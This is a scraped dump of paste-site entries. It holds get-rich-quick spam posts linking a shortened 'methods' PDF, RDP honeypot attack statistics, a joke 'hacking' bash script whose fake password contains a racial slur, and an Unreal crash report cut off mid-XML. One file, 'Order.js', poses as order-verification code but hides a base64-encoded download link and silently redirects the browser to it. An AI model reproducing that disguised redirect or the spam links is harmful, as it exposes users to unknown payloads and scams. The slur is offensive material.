id,title,username,language,date,content
zDbW8vfK,EARN $900 INSTANTLY 2025 BT,nashetysdasd,JavaScript,Sunday 30th of March 2025 07:19:22 PM CDT," 
Pdf https://tinyurl.com/methodssss


dQbCjS2CAR
"
0Gw6wNCY,2025-03-29_stats.json,rdp_snitch,JSON,Sunday 30th of March 2025 07:18:22 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 50232,
    ""150.95.89.149"": 9699,
    ""138.199.24.6"": 93309,
    ""103.228.37.126"": 2949,
    ""156.146.57.52"": 9759,
    ""156.146.57.174"": 9738,
    ""147.182.229.114"": 477,
    ""146.190.105.191"": 1755,
    ""106.14.144.233"": 435,
    ""103.75.183.173"": 24,
    ""165.22.141.209"": 12,
    ""165.22.141.51"": 3,
    ""1.4.220.16"": 6,
    ""188.166.250.11"": 6,
    ""205.210.31.39"": 9,
    ""88.214.25.122"": 6,
    ""194.180.49.233"": 12,
    ""91.238.181.95"": 6,
    ""143.198.113.150"": 3,
    ""157.245.104.150"": 18,
    ""205.210.31.37"": 9,
    ""178.20.129.235"": 3,
    ""47.121.132.191"": 30,
    ""58.218.199.219"": 15,
    ""147.185.132.81"": 9,
    ""45.156.130.10"": 18,
    ""194.165.16.167"": 6,
    ""198.235.24.108"": 9,
    ""148.163.113.105"": 120,
    ""88.214.25.125"": 6
  },
  ""asn"": {
    ""AS212238"": 69729,
    ""AS135161"": 9699,
    ""AS60068"": 93309,
    ""AS135918"": 2949,
    ""AS14061"": 2274,
    ""AS37963"": 465,
    ""AS151858"": 24,
    ""AS23969"": 6,
    ""AS396982"": 36,
    ""AS35042"": 12,
    ""AS201814"": 12,
    ""AS49434"": 6,
    ""AS24810"": 3,
    ""AS4134"": 15,
    ""AS211680"": 18,
    ""AS48721"": 6,
    ""AS53755"": 120
  },
  ""isp"": {
    ""Datacamp Limited"": 69729,
    ""GMO-Z.COM PTE. LTD."": 9699,
    ""DataCamp Limited"": 93309,
    ""DXT"": 2949,
    ""DigitalOcean, LLC"": 2274,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""BQT"": 24,
    ""TOT Public Company Limited"": 6,
    ""Google LLC"": 36,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""MEVSPACE sp. z o.o."": 12,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 30,
    ""Chinanet"": 15,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""Flyservers S.A."": 6,
    ""Input Output Flood LLC"": 120
  },
  ""org"": {
    ""Datacamp Limited"": 69729,
    ""Zcom Thai"": 9699,
    ""Cdn77 SGP"": 93309,
    ""DXT Digital Transformation Technology Joint Stock Company"": 2949,
    ""DigitalOcean, LLC"": 2268,
    ""Aliyun Computing Co., LTD"": 435,
    ""Unknown"": 24,
    ""TOT Public Company Limited"": 6,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""HostSlick"": 12,
    ""Teleset LLC"": 3,
    ""Alibaba.com LLC"": 30,
    ""Chinanet JS"": 15,
    ""Inap PHX"": 18,
    ""Flyservers S.A"": 6,
    ""Input Output Flood LLC"": 120
  },
  ""regionName"": {
    ""North West"": 163038,
    ""Tokyo"": 9699,
    ""Hanoi"": 2949,
    ""California"": 528,
    ""South West"": 1761,
    ""Shanghai"": 435,
    ""Ho Chi Minh"": 24,
    ""Surat Thani"": 6,
    ""Kowloon City"": 12,
    ""Bavaria"": 12,
    ""\u00cele-de-France"": 6,
    ""New Jersey"": 3,
    ""Karnataka"": 18,
    ""Tatarstan Republic"": 3,
    ""Guangdong"": 30,
    ""Jiangsu"": 15,
    ""Arizona"": 138,
    ""Kaunas"": 6
  },
  ""country"": {
    ""Singapore"": 164799,
    ""Japan"": 9699,
    ""Vietnam"": 2973,
    ""United States"": 669,
    ""China"": 480,
    ""Thailand"": 6,
    ""Hong Kong"": 12,
    ""Germany"": 12,
    ""France"": 6,
    ""India"": 18,
    ""Russia"": 3,
    ""Lithuania"": 6
  },
  ""account"": {
    ""hello"": 178590,
    ""2wrqfzgp"": 12,
    ""beio"": 3,
    ""RzslnqnZi"": 3,
    ""FhYVUj"": 3,
    ""pTnvIy"": 3,
    ""Test"": 24,
    ""uefimVgQR"": 3,
    ""xNsXwu"": 3,
    ""EJVdUA"": 3,
    ""imVuWcXCP"": 3,
    ""npntfj"": 3,
    ""OljLWu"": 3,
    ""root"": 18,
    ""wIJMiqTsM"": 3,
    ""FPzund"": 3,
    ""YodAXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 178683
  },
  ""client_build"": {
    ""Unknown"": 178683
  },
  ""client_name"": {
    ""Unknown"": 178683
  },
  ""ip_type"": {
    ""hosting & proxy"": 165723,
    ""hosting"": 9915,
    ""Unknown"": 3030,
    ""proxy"": 15
  }
}"
rzdkKpxh,2025-03-29_stats.json,rdp_snitch,JSON,Sunday 30th of March 2025 07:16:25 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 50228,
    ""150.95.89.149"": 9698,
    ""138.199.24.6"": 93309,
    ""103.228.37.126"": 2949,
    ""156.146.57.52"": 9759,
    ""156.146.57.174"": 9738,
    ""147.182.229.114"": 477,
    ""146.190.105.191"": 1755,
    ""106.14.144.233"": 435,
    ""103.75.183.173"": 24,
    ""165.22.141.209"": 12,
    ""165.22.141.51"": 3,
    ""1.4.220.16"": 6,
    ""188.166.250.11"": 6,
    ""205.210.31.39"": 9,
    ""88.214.25.122"": 6,
    ""194.180.49.233"": 12,
    ""91.238.181.95"": 6,
    ""143.198.113.150"": 3,
    ""157.245.104.150"": 18,
    ""205.210.31.37"": 9,
    ""178.20.129.235"": 3,
    ""47.121.132.191"": 30,
    ""58.218.199.219"": 15,
    ""147.185.132.81"": 9,
    ""45.156.130.10"": 18,
    ""194.165.16.167"": 6,
    ""198.235.24.108"": 9,
    ""148.163.113.105"": 120,
    ""88.214.25.125"": 6
  },
  ""asn"": {
    ""AS212238"": 69725,
    ""AS135161"": 9698,
    ""AS60068"": 93309,
    ""AS135918"": 2949,
    ""AS14061"": 2274,
    ""AS37963"": 465,
    ""AS151858"": 24,
    ""AS23969"": 6,
    ""AS396982"": 36,
    ""AS35042"": 12,
    ""AS201814"": 12,
    ""AS49434"": 6,
    ""AS24810"": 3,
    ""AS4134"": 15,
    ""AS211680"": 18,
    ""AS48721"": 6,
    ""AS53755"": 120
  },
  ""isp"": {
    ""Datacamp Limited"": 69725,
    ""GMO-Z.COM PTE. LTD."": 9698,
    ""DataCamp Limited"": 93309,
    ""DXT"": 2949,
    ""DigitalOcean, LLC"": 2274,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""BQT"": 24,
    ""TOT Public Company Limited"": 6,
    ""Google LLC"": 36,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""MEVSPACE sp. z o.o."": 12,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 30,
    ""Chinanet"": 15,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""Flyservers S.A."": 6,
    ""Input Output Flood LLC"": 120
  },
  ""org"": {
    ""Datacamp Limited"": 69725,
    ""Zcom Thai"": 9698,
    ""Cdn77 SGP"": 93309,
    ""DXT Digital Transformation Technology Joint Stock Company"": 2949,
    ""DigitalOcean, LLC"": 2268,
    ""Aliyun Computing Co., LTD"": 435,
    ""Unknown"": 24,
    ""TOT Public Company Limited"": 6,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""HostSlick"": 12,
    ""Teleset LLC"": 3,
    ""Alibaba.com LLC"": 30,
    ""Chinanet JS"": 15,
    ""Inap PHX"": 18,
    ""Flyservers S.A"": 6,
    ""Input Output Flood LLC"": 120
  },
  ""regionName"": {
    ""North West"": 163034,
    ""Tokyo"": 9698,
    ""Hanoi"": 2949,
    ""California"": 528,
    ""South West"": 1761,
    ""Shanghai"": 435,
    ""Ho Chi Minh"": 24,
    ""Surat Thani"": 6,
    ""Kowloon City"": 12,
    ""Bavaria"": 12,
    ""\u00cele-de-France"": 6,
    ""New Jersey"": 3,
    ""Karnataka"": 18,
    ""Tatarstan Republic"": 3,
    ""Guangdong"": 30,
    ""Jiangsu"": 15,
    ""Arizona"": 138,
    ""Kaunas"": 6
  },
  ""country"": {
    ""Singapore"": 164795,
    ""Japan"": 9698,
    ""Vietnam"": 2973,
    ""United States"": 669,
    ""China"": 480,
    ""Thailand"": 6,
    ""Hong Kong"": 12,
    ""Germany"": 12,
    ""France"": 6,
    ""India"": 18,
    ""Russia"": 3,
    ""Lithuania"": 6
  },
  ""account"": {
    ""hello"": 178585,
    ""2wrqfzgp"": 12,
    ""beio"": 3,
    ""RzslnqnZi"": 3,
    ""FhYVUj"": 3,
    ""pTnvIy"": 3,
    ""Test"": 24,
    ""uefimVgQR"": 3,
    ""xNsXwu"": 3,
    ""EJVdUA"": 3,
    ""imVuWcXCP"": 3,
    ""npntfj"": 3,
    ""OljLWu"": 3,
    ""root"": 18,
    ""wIJMiqTsM"": 3,
    ""FPzund"": 3,
    ""YodAXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 178678
  },
  ""client_build"": {
    ""Unknown"": 178678
  },
  ""client_name"": {
    ""Unknown"": 178678
  },
  ""ip_type"": {
    ""hosting & proxy"": 165719,
    ""hosting"": 9914,
    ""Unknown"": 3030,
    ""proxy"": 15
  }
}"
VNAev3Ek,2025-03-29_stats.json,rdp_snitch,JSON,Sunday 30th of March 2025 07:15:18 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 50224,
    ""150.95.89.149"": 9697,
    ""138.199.24.6"": 93309,
    ""103.228.37.126"": 2949,
    ""156.146.57.52"": 9759,
    ""156.146.57.174"": 9738,
    ""147.182.229.114"": 477,
    ""146.190.105.191"": 1755,
    ""106.14.144.233"": 435,
    ""103.75.183.173"": 24,
    ""165.22.141.209"": 12,
    ""165.22.141.51"": 3,
    ""1.4.220.16"": 6,
    ""188.166.250.11"": 6,
    ""205.210.31.39"": 9,
    ""88.214.25.122"": 6,
    ""194.180.49.233"": 12,
    ""91.238.181.95"": 6,
    ""143.198.113.150"": 3,
    ""157.245.104.150"": 18,
    ""205.210.31.37"": 9,
    ""178.20.129.235"": 3,
    ""47.121.132.191"": 30,
    ""58.218.199.219"": 15,
    ""147.185.132.81"": 9,
    ""45.156.130.10"": 18,
    ""194.165.16.167"": 6,
    ""198.235.24.108"": 9,
    ""148.163.113.105"": 120,
    ""88.214.25.125"": 6
  },
  ""asn"": {
    ""AS212238"": 69721,
    ""AS135161"": 9697,
    ""AS60068"": 93309,
    ""AS135918"": 2949,
    ""AS14061"": 2274,
    ""AS37963"": 465,
    ""AS151858"": 24,
    ""AS23969"": 6,
    ""AS396982"": 36,
    ""AS35042"": 12,
    ""AS201814"": 12,
    ""AS49434"": 6,
    ""AS24810"": 3,
    ""AS4134"": 15,
    ""AS211680"": 18,
    ""AS48721"": 6,
    ""AS53755"": 120
  },
  ""isp"": {
    ""Datacamp Limited"": 69721,
    ""GMO-Z.COM PTE. LTD."": 9697,
    ""DataCamp Limited"": 93309,
    ""DXT"": 2949,
    ""DigitalOcean, LLC"": 2274,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""BQT"": 24,
    ""TOT Public Company Limited"": 6,
    ""Google LLC"": 36,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""MEVSPACE sp. z o.o."": 12,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 30,
    ""Chinanet"": 15,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""Flyservers S.A."": 6,
    ""Input Output Flood LLC"": 120
  },
  ""org"": {
    ""Datacamp Limited"": 69721,
    ""Zcom Thai"": 9697,
    ""Cdn77 SGP"": 93309,
    ""DXT Digital Transformation Technology Joint Stock Company"": 2949,
    ""DigitalOcean, LLC"": 2268,
    ""Aliyun Computing Co., LTD"": 435,
    ""Unknown"": 24,
    ""TOT Public Company Limited"": 6,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""HostSlick"": 12,
    ""Teleset LLC"": 3,
    ""Alibaba.com LLC"": 30,
    ""Chinanet JS"": 15,
    ""Inap PHX"": 18,
    ""Flyservers S.A"": 6,
    ""Input Output Flood LLC"": 120
  },
  ""regionName"": {
    ""North West"": 163030,
    ""Tokyo"": 9697,
    ""Hanoi"": 2949,
    ""California"": 528,
    ""South West"": 1761,
    ""Shanghai"": 435,
    ""Ho Chi Minh"": 24,
    ""Surat Thani"": 6,
    ""Kowloon City"": 12,
    ""Bavaria"": 12,
    ""\u00cele-de-France"": 6,
    ""New Jersey"": 3,
    ""Karnataka"": 18,
    ""Tatarstan Republic"": 3,
    ""Guangdong"": 30,
    ""Jiangsu"": 15,
    ""Arizona"": 138,
    ""Kaunas"": 6
  },
  ""country"": {
    ""Singapore"": 164791,
    ""Japan"": 9697,
    ""Vietnam"": 2973,
    ""United States"": 669,
    ""China"": 480,
    ""Thailand"": 6,
    ""Hong Kong"": 12,
    ""Germany"": 12,
    ""France"": 6,
    ""India"": 18,
    ""Russia"": 3,
    ""Lithuania"": 6
  },
  ""account"": {
    ""hello"": 178580,
    ""2wrqfzgp"": 12,
    ""beio"": 3,
    ""RzslnqnZi"": 3,
    ""FhYVUj"": 3,
    ""pTnvIy"": 3,
    ""Test"": 24,
    ""uefimVgQR"": 3,
    ""xNsXwu"": 3,
    ""EJVdUA"": 3,
    ""imVuWcXCP"": 3,
    ""npntfj"": 3,
    ""OljLWu"": 3,
    ""root"": 18,
    ""wIJMiqTsM"": 3,
    ""FPzund"": 3,
    ""YodAXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 178673
  },
  ""client_build"": {
    ""Unknown"": 178673
  },
  ""client_name"": {
    ""Unknown"": 178673
  },
  ""ip_type"": {
    ""hosting & proxy"": 165715,
    ""hosting"": 9913,
    ""Unknown"": 3030,
    ""proxy"": 15
  }
}"
aperZvHn,Order.js,navrajkhunger,JavaScript,Sunday 30th of March 2025 07:12:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/508/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cXVzNxRn,Untitled,Sombody101,Bash,Sunday 30th of March 2025 07:08:55 PM CDT,"#!/bin/bash

echo
echo

gecko '$ ssh hackerman@127.0.225.69 -y'

gecko '┌──([deepskyblue3_1]hackerman@azure_root_server[/])-[[~/hackerman_assets]'
gecko '╰─[deepskyblue3_1]$[/] hack ""SomeSkidsAccount""'
gecko 'Hacking user: [gold1]SomeSkidsAccount[/]...'

gecko '[pink1]Indexing Roblox.com...[/]'
gecko '[pink1]Locating user in DB...[/]'

gecko '[red]Failed to find user account in namespace[/] [cyan1]AWS-region-arizona-xx42[/].'
gecko 'Switching regions...'

gecko '[pink1]User found in[/] [cyan1]AWS-region-russia-af3[/].'

echo

gecko '[lightseagreen]Password Found:[/]'
gecko '  └─ [royalblue1]niggabals123[/]'

echo
echo"
1A7MubBU,Random Gmail Acc 1A,nashetysdasd,JavaScript,Sunday 30th of March 2025 07:03:25 PM CDT," 
Pdf https://tinyurl.com/methodssss


zmvqsEj8fc
"
z4tdWUDh,Make $1000 15-MINUTES (BEGINNER) WM,nashetysdasd,JavaScript,Sunday 30th of March 2025 06:47:27 PM CDT," 
Pdf https://tinyurl.com/methodssss


khFAKGltcI
"
zxmn37CZ,Delos-Crash_2025_03_30_CobraCommander,PacketNarc,XML,Sunday 30th of March 2025 06:42:25 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<FGenericCrashContext>
	<RuntimeProperties>
		<CrashVersion>3</CrashVersion>
		<ExecutionGuid>FF84E40540D52B2679AD9887032A0A92</ExecutionGuid>
		<CrashGUID>UECC-Windows-EAD157B04BDC107A27A0F8BCCD3C63DF_0000</CrashGUID>
		<IsEnsure>false</IsEnsure>
		<IsStall>false</IsStall>
		<IsAssert>true</IsAssert>
		<CrashType>Assert</CrashType>
		<ErrorMessage>LowLevelFatalError [File:D:\build\++UE5\Sync\Engine\Source\Runtime\CoreUObject\Private\UObject\UObjectArray.cpp] [Line: 329] Removing object (0x00000263a453ad20) at index 0 but the index points to a different object (0x00000263f6677e80)!</ErrorMessage>
		<CrashReporterMessage />
		<CrashReporterMessage>Attended</CrashReporterMessage>
		<ProcessId>5008</ProcessId>
		<SecondsSinceStart>882</SecondsSinceStart>
		<IsInternalBuild>false</IsInternalBuild>
		<IsPerforceBuild>false</IsPerforceBuild>
		<IsWithDebugInfo>false</IsWithDebugInfo>
		<IsSourceDistribution>false</IsSourceDistribution>
		<GameName>UE-SpaceATC</GameName>
		<ExecutableName>SpaceATC-Win64-Shipping</ExecutableName>
		<BuildConfiguration>Shipping</BuildConfiguration>
		<GameSessionID />
		<PlatformName>Windows</PlatformName>
		<PlatformFullName>Win64 [Windows 11 (24H2) [10.0.26100.3476]  64b]</PlatformFullName>
		<PlatformNameIni>Windows</PlatformNameIni>
		<EngineMode>Game</EngineMode>
		<EngineModeEx>Unset</EngineModeEx>
		<DeploymentName />
		<EngineVersion>5.4.4-35576357+++UE5+Release-5.4</EngineVersion>
		<EngineCompatibleVersion>5.4.4-35576357+++UE5+Release-5.4</EngineCompatibleVersion>
		<CommandLine>SpaceATC</CommandLine>
		<LanguageLCID>0</LanguageLCID>
		<AppDefaultLocale>en-US</AppDefaultLocale>
		<BuildVersion>++UE5+Release-5.4-CL-35576357</BuildVersion>
		<Symbols>**UE5*Release-5.4-CL-35576357-Win64-Shipping</Symbols>
		<IsUERelease>true</IsUERelease>
		<IsRequestingExit>false</IsRequestingExit>
		<UserName />
		<BaseDir>C:/Program Files (x86)/Steam/steamapps/common/Delos/SpaceATC/Binaries/Win64/</BaseDir>
		<RootDir>C:/Program Files (x86)/Steam/steamapps/common/Delos/</RootDir>
		<MachineId>1AB8E0A8432C73E79D4B1A82136DB802</MachineId>
		<LoginId>1ab8e0a8432c73e79d4b1a82136db802</LoginId>
		<EpicAccountId />
		<SourceContext />
		<UserDescription />
		<UserActivityHint />
		<CrashDumpMode>0</CrashDumpMode>
		<GameStateName>SATC_GameState</GameStateName>
		<Misc.NumberOfCores>24</Misc.NumberOfCores>
		<Misc.NumberOfCoresIncludingHyperthreads>32</Misc.NumberOfCoresIncludingHyperthreads>
		<Misc.Is64bitOperatingSystem>1</Misc.Is64bitOperatingSystem>
		<Misc.CPUVendor>GenuineIntel</Misc.CPUVendor>
		<Misc.CPUBrand>Intel(R) Core(TM) i9-14900KF</Misc.CPUBrand>
		<Misc.PrimaryGPUBrand>NVIDIA GeForce RTX 4080 SUPER</Misc.PrimaryGPUBrand>
		<Misc.OSVersionMajor>Windows 11 (24H2) [10.0.26100.3476]</Misc.OSVersionMajor>
		<Misc.OSVersionMinor />
		<Misc.AnticheatProvider />
		<MemoryStats.TotalPhysical>34034339840</MemoryStats.TotalPhysical>
		<MemoryStats.TotalVirtual>63025369088</MemoryStats.TotalVirtual>
		<MemoryStats.PageSize>4096</MemoryStats.PageSize>
		<MemoryStats.TotalPhysicalGB>32</MemoryStats.TotalPhysicalGB>
		<MemoryStats.AvailablePhysical>20267765760</MemoryStats.AvailablePhysical>
		<MemoryStats.AvailableVirtual>39803920384</MemoryStats.AvailableVirtual>
		<MemoryStats.UsedPhysical>936574976</MemoryStats.UsedPhysical>
		<MemoryStats.PeakUsedPhysical>1137152000</MemoryStats.PeakUsedPhysical>
		<MemoryStats.UsedVirtual>3262234624</MemoryStats.UsedVirtual>
		<MemoryStats.PeakUsedVirtual>3457253376</MemoryStats.PeakUsedVirtual>
		<MemoryStats.bIsOOM>0</MemoryStats.bIsOOM>
		<MemoryStats.OOMAllocationSize>0</MemoryStats.OOMAllocationSize>
		<MemoryStats.OOMAllocationAlignment>0</MemoryStats.OOMAllocationAlignment>
		<NumMinidumpFramesToIgnore>4</NumMinidumpFramesToIgnore>
		<CallStack>SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
SpaceATC_Win64_Shipping
kernel32
ntdll</CallStack>
		<PCallStack>SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 12c12cc SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 4290e94 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1211664 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11cce43 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11cd042 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11b0dbe SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11d0118 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11ba981 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c42ec2 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c3083b SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c0db91 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c41bd0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 35d1da3 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d54fc4 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d5c58c SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d5c60a SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d5d430 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d65714 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 5d58b52 KERNEL32 0x00007ffc3c030000 + 2e8d7</PCallStack>
		<PCallStackHash>412C468DC8C74446F27B6303F8CCB2F60B5E5BE1</PCallStackHash>
		<Threads>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10d7dbf SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 5d868be VCRUNTIME140 0x00007ffc17750000 + e7bf ntdll 0x00007ffc3d760000 + 163f2f ntdll 0x00007ffc3d760000 + 13b78 ntdll 0x00007ffc3d760000 + 12b86 KERNELBASE 0x00007ffc3ac50000 + cab6a SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10da178 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1080f30 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 102c2b6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 12c12cc SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 4290e94 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1211664 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11cce43 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11cd042 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11b0dbe SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11d0118 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11ba981 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c42ec2 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c3083b SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c0db91 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c41bd0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 35d1da3 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d54fc4 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d5c58c SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d5c60a SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d5d430 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d65714 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 5d58b52 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>true</IsCrashed>
				<Registers />
				<ThreadID>31632</ThreadID>
				<ThreadName>GameThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>3052</ThreadID>
				<ThreadName>Foreground Worker #0</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34496</ThreadID>
				<ThreadName>Foreground Worker #1</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>28936</ThreadID>
				<ThreadName>Background Worker #2</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>6120</ThreadID>
				<ThreadName>Background Worker #3</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>16116</ThreadID>
				<ThreadName>Background Worker #4</ThreadName>
			</Thread>
			<Thread>
